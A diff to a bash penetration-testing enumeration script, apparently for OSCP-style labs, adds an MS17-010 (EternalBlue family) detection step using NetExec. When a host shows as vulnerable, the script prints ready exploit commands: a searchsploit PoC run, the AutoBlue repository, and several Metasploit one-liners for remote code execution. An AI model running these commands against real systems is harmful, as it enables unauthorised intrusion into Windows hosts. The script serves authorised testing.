@@ -240,6 +240,58 @@ else
 fi
 
 # ===========================================================================
+# 6e — MS17-010 / EternalBlue family check (nxc -M ms17-010)
+#      Gated on Windows detection — skipped on Samba / unknown OS to avoid
+#      false positives and wasted scan time. Read-only detection module.
+#      Covers EternalBlue / EternalRomance / EternalSynergy / EternalChampion
+#      (same underlying SMBv1 SRV driver bug, CVE-2017-0143..0148).
+# ===========================================================================
+if [[ -n "$NXC" ]]; then
+    IS_WINDOWS=false
+    if [[ -f "$NMAP_SMB" ]]; then
+        if grep -qiE 'OS:\s*Windows|Windows Server|microsoft-ds.*Windows|smb-os-discovery.*Windows' "$NMAP_SMB" 2>/dev/null \
+           && ! grep -qiE 'Samba\s+smbd' "$NMAP_SMB" 2>/dev/null; then
+            IS_WINDOWS=true
+        fi
+    fi
+    # Also trust NXC banner from section 6 if it landed
+    if ! $IS_WINDOWS && [[ -f "${SMB_DIR}/nxc_shares.txt" ]]; then
+        if grep -qiE 'Windows\s+[0-9]+\.[0-9]+\s+Build' "${SMB_DIR}/nxc_shares.txt" 2>/dev/null; then
+            IS_WINDOWS=true
+        fi
+    fi
+
+    if $IS_WINDOWS; then
+        info "[6e/7] MS17-010 check — ${NXC} -M ms17-010 (Windows host detected)"
+        NXC_MS17="${SMB_DIR}/nxc_ms17010.txt"
+
+        NXC_MS17_ARGS=( smb "$TARGET" -u '' -p '' -M ms17-010 )
+        [[ -n "$DOMAIN" ]] && NXC_MS17_ARGS+=( -d "$DOMAIN" )
+
+        cmd "$NXC ${NXC_MS17_ARGS[*]}"
+        $NXC "${NXC_MS17_ARGS[@]}" 2>&1 | tee "$NXC_MS17" || true
+
+        if grep -qiE 'VULNERABLE|is vulnerable to ms17-010' "$NXC_MS17" 2>/dev/null; then
+            warn "MS17-010 VULNERABLE — EternalBlue / EternalRomance / EternalSynergy / EternalChampion"
+            hint "Confirmed MS17-010 family — exploit paths (pick based on target OS):
+  # Preferred: standalone PoC (no MSF quota)
+  searchsploit -m 42315 && python3 42315.py ${TARGET}
+  # AutoBlue: git clone https://github.com/3ndG4me/AutoBlue-MS17-010
+  # MSF (OSCP: 1 machine only):
+  msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS ${TARGET}; run'
+  # EternalRomance / EternalSynergy / EternalChampion variants (Win8/2012 where EternalBlue often fails):
+  msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS ${TARGET}; run'
+  msfconsole -q -x 'use exploit/windows/smb/ms17_010_psexec; set RHOSTS ${TARGET}; run'
+  msfconsole -q -x 'use exploit/windows/smb/ms17_010_command; set RHOSTS ${TARGET}; set CMD <cmd>; run'"
+        fi
+        echo ""
+    else
+        info "[6e/7] MS17-010 check — skipped (target not identified as Windows)"
+        echo ""
+    fi
+fi
+
+# ===========================================================================
 # 6b — RID Cycling (nxc --rid-brute)
 #      Enumerates ALL domain users by iterating SIDs from 500 to 10000.
 #      Works even when enumdomusers / SAMR is blocked.
